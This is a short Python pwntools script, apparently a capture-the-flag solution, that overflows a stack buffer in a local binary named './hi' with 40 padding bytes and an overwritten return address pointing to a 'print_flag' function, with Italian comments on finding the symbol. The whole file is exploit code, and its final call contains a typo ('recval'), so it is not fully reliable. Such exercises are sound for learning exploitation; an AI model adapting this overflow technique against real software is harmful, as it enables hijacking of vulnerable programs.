from pwn import *

garbage = b'a' * 40
address = p64(0x00400637)
#o eventualmente creo un oggetto elf e uso il metodo symbols
#e = ELF('./hi')
#address = p64(e.symbols['print_flag'])
msgin = garbage + address

p = process('./hi')
p.sendline(msgin)
print(p.recval())